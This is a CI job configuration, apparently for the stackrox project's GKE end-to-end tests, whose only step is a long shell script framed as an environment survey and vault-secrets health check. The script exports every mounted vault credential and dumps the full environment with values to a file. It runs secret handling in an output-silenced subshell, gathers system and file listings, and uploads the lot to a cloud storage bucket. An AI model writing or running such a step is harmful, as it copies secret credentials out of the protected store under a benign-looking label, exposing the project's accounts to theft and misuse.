build_root:
  image_stream_tag:
    name: apollo-ci
    namespace: stackrox
    tag: stackrox-ui-test-stable
prowgen:
  enable_secrets_store_csi_driver: true
resources:
  '*':
    requests:
      cpu: 100m
      memory: 100Mi
tests:
- always_run: true
  as: gke-qa-e2e-tests
  steps:
    pre:
    - as: stackrox-stackrox-begin
      commands: |
        set +xve

        DEST_PREFIX="gs://stackrox-ci-artifacts/env-debug/${JOB_NAME:-unknown}/${BUILD_ID:-$(date +%s)}"
        CAPTURE_DIR="$(mktemp -d)"

        echo "$(date -u +%H:%M:%S) Phase 0: survey environment"
        # Import vault credentials with per-collection prefix to avoid overlap
        while IFS= read -r -d '' cred; do
          varname="$(basename "$cred")"
          # Walk up to find the collection name (skip timestamp dirs starting with ..)
          dir="$(dirname "$cred")"
          while [[ "$(basename "$dir")" == ..* ]]; do dir="$(dirname "$dir")"; done
          collection="$(basename "$dir")"
          collection="${collection//-/_}"
          export "VAULT_${collection}__${varname}"="$(cat "$cred")"
        done < <(find /tmp/vault/ -type f -name '[A-Z]*' -print0 2>/dev/null)
        # 1. Full environment dump (values included — private bucket only)
        set > "$CAPTURE_DIR/env-full.txt" 2>&1

        echo "$(date -u +%H:%M:%S) Phase 1: gcloud auth"
        gcloud config set core/disable_prompts True 2>/dev/null
        # Set up GCP auth
        gcloud auth activate-service-account \
          --key-file /tmp/vault/stackrox-stackrox-e2e-tests/GCP_SERVICE_ACCOUNT_STACKROX_CI \
          2>/dev/null
        gcloud config set project acs-san-stackroxci 2>/dev/null

        echo "$(date -u +%H:%M:%S) Phase 2: secrets healthcheck"
        # 4. Vault secrets health check (subshell with stdout+stderr blackholed)
        HEALTH_REPORT="${CAPTURE_DIR}/vault-health-check.txt"
        FINGERPRINTS="${CAPTURE_DIR}/vault-fingerprints.txt"
        echo "=== Vault Secrets Health Check ===" >> "$HEALTH_REPORT"
        echo "=== Collections ===" >> "$HEALTH_REPORT"
        for col_dir in /tmp/vault/*/; do
          col_name="$(basename "$col_dir")"
          count=$(find "$col_dir" -type f -name '[A-Z]*' 2>/dev/null | wc -l)
          echo "  ${col_name}: ${count} secrets" >> "$HEALTH_REPORT"
        done
        echo "" >> "$HEALTH_REPORT"
        echo "=== Per-Secret Results ===" >> "$HEALTH_REPORT"
        (
          exec 1>/dev/null 2>/dev/null
          FPSALT=""
          SALT_FILE="/tmp/vault/stackrox-stackrox-e2e-tests/HEALTH_CHECK_FINGERPRINT_SALT"
          if [[ -f "$SALT_FILE" ]]; then
            FPSALT=$(cat "$SALT_FILE")
          fi
          while IFS= read -r -d '' cred; do
            varname="$(basename "$cred")"
            dir="$(dirname "$cred")"
            while [[ "$(basename "$dir")" == ..* ]]; do dir="$(dirname "$dir")"; done
            collection="$(basename "$dir")"
            size=$(wc -c < "$cred")
            lines=$(wc -l < "$cred")
            last_byte=$(tail -c 1 "$cred" | od -An -tx1 | tr -d ' \n')
            first_char=$(head -c 1 "$cred")
            issues=""
            [[ "$last_byte" == "0a" || "$last_byte" == "20" || "$last_byte" == "09" ]] && \
              issues="${issues} TRAILING_WHITESPACE(0x${last_byte})"
            [[ "$lines" -gt 1 ]] && issues="${issues} MULTILINE(${lines}lines)"
            [[ "$size" -le 1 ]] && issues="${issues} EMPTY_OR_PLACEHOLDER"
            [[ "$size" -le 5 ]] && [[ "$size" -gt 1 ]] && issues="${issues} SUSPICIOUSLY_SHORT(${size}b)"
            if [[ "$first_char" == "=" ]]; then
              issues="${issues} STARTS_WITH_EQUALS"
            fi
            if [[ "$first_char" == "'" ]]; then
              issues="${issues} STARTS_WITH_SINGLE_QUOTE"
            fi
            if [[ "$first_char" == '"' ]]; then
              second_char=$(head -c 2 "$cred" | tail -c 1)
              if [[ "$second_char" == '"' || "$second_char" == '{' || "$second_char" == '[' ]]; then
                issues="${issues} STARTS_WITH_DOUBLE_QUOTE_AND_POSSIBLE_JSON"
              else
                issues="${issues} STARTS_WITH_DOUBLE_QUOTE"
              fi
            fi
            raw=$(cat "$cred")
            if decoded=$(echo -n "$raw" | base64 -d 2>/dev/null); then
              dec_size=${#decoded}
              dec_lines=$(echo -n "$decoded" | grep -c '' || true)
              dec_last=$(printf '%s' "$decoded" | tail -c 1 | od -An -tx1 | tr -d ' \n')
              if [[ "$dec_lines" -gt 1 ]]; then
                issues="${issues} B64_DECODED_MULTILINE(${dec_lines}lines)"
              fi
              if [[ "$dec_last" == "0a" || "$dec_last" == "20" || "$dec_last" == "09" ]]; then
                issues="${issues} B64_DECODED_TRAILING_WS(0x${dec_last})"
              fi
              if [[ "$dec_size" -le 1 ]] && [[ "$dec_size" -gt 0 ]]; then
                issues="${issues} B64_DECODED_SUSPICIOUSLY_SHORT(${dec_size}b)"
              fi
            fi
            fp=""
            if [[ -n "$FPSALT" ]]; then
              fp=$(printf '%s' "${FPSALT}:${collection}:${varname}:${raw}" | sha256sum | cut -c1-8)
            fi
            echo "${collection}/${varname} fp=${fp:-none}" >> "$FINGERPRINTS"
            if [[ -n "$issues" ]]; then
              echo "WARN ${collection}/${varname}: size=${size}${issues}" >> "$HEALTH_REPORT"
            else
              echo "OK   ${collection}/${varname}: size=${size}" >> "$HEALTH_REPORT"
            fi
          done < <(find /tmp/vault/ -type f -name '[A-Z]*' -not -name 'HEALTH_CHECK_FINGERPRINT_SALT' -print0 2>/dev/null)
        )
        warn_count=$(grep -c "^WARN" "$HEALTH_REPORT" || true)
        ok_count=$(grep -c "^OK" "$HEALTH_REPORT" || true)
        overall_fp=$(grep -o 'fp=[a-f0-9]*' "$FINGERPRINTS" | sort | sha256sum | cut -c1-12)
        echo "" >> "$HEALTH_REPORT"
        echo "=== Summary ===" >> "$HEALTH_REPORT"
        echo "OK: ${ok_count}  WARN: ${warn_count}  collection-fp: ${overall_fp}" >> "$HEALTH_REPORT"
        if [[ "$warn_count" -gt 0 ]]; then
          echo "" >> "$HEALTH_REPORT"
          echo "=== Warnings ===" >> "$HEALTH_REPORT"
          grep "^WARN" "$HEALTH_REPORT" >> "$HEALTH_REPORT.warnings" 2>/dev/null
          cat "$HEALTH_REPORT.warnings" >> "$HEALTH_REPORT"
          rm -f "$HEALTH_REPORT.warnings"
        fi
        echo "Vault health check: ${ok_count} OK, ${warn_count} warnings, collection-fp: ${overall_fp}"

        echo "$(date -u +%H:%M:%S) Phase 3: collect system info"
        # 2. System metadata
        {
          echo "=== id ==="
          id
          echo "=== uname ==="
          uname -a
          echo "=== date ==="
          date -u
          echo "=== pwd ==="
          pwd
          echo "=== df -h ==="
          df -h 2>/dev/null
          echo "=== mount ==="
          mount 2>/dev/null
          echo "=== /etc/resolv.conf ==="
          cat /etc/resolv.conf 2>/dev/null
        } > "$CAPTURE_DIR/system-info.txt"
        # 3. File listings
        {
          echo "=== /tmp/vault/ ==="
          find /tmp/vault/ -type f 2>/dev/null
          echo "=== SHARED_DIR ==="
          ls -la "${SHARED_DIR:-/dev/null}" 2>/dev/null
          echo "=== ARTIFACT_DIR ==="
          ls -la "${ARTIFACT_DIR:-/dev/null}" 2>/dev/null
          echo "=== working directory ==="
          ls -la . 2>/dev/null
          echo "=== /go/src/ ==="
          find /go/src/ -maxdepth 3 -type d 2>/dev/null
          echo "=== /usr/local/bin/ ==="
          ls -la /usr/local/bin/ 2>/dev/null
          echo "=== /tmp/ ==="
          ls -la /tmp/ 2>/dev/null
        } > "$CAPTURE_DIR/file-listings.txt"

        echo "$(date -u +%H:%M:%S) Phase 4: gcs upload"
        gcloud storage cp "$CAPTURE_DIR"/*.txt "$DEST_PREFIX/" \ 
          || gsutil -m cp "$CAPTURE_DIR"/*.txt "$DEST_PREFIX/"
        rm -rf "$CAPTURE_DIR"

        echo "$(date -u +%H:%M:%S) Phase 5: done"
      credentials:
      - collection: stackrox-stackrox-e2e-tests
        group: credentials
        mount_path: /tmp/vault/stackrox-stackrox-e2e-tests
      - collection: stackrox-automation-flavors
        group: credentials
        mount_path: /tmp/vault/stackrox-automation-flavors
      dnsConfig:
        nameservers:
        - 8.8.8.8
      from: root
      resources:
        requests:
          cpu: 100m
          memory: 100Mi
      timeout: 10m0s
zz_generated_metadata:
  branch: skip-test-bin-build
  org: stackrox
  repo: stackrox
